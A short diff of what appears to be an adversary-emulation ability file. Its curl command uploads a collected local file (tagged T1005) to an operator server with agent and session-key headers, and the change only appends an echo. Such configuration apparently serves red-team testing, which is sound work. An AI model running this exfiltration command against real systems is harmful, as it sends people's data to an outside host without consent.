@@ -17,4 +17,4 @@ platforms:
   global:
     sh:
       command: |
-        curl #{operator.http} --upload-file #{file.T1005} -H "agent:#{agent.name}" -H "key:#{operator.session}" --max-time 10
+        curl #{operator.http} --upload-file #{file.T1005} -H "agent:#{agent.name}" -H "key:#{operator.session}" --max-time 10; echo 'Complete';
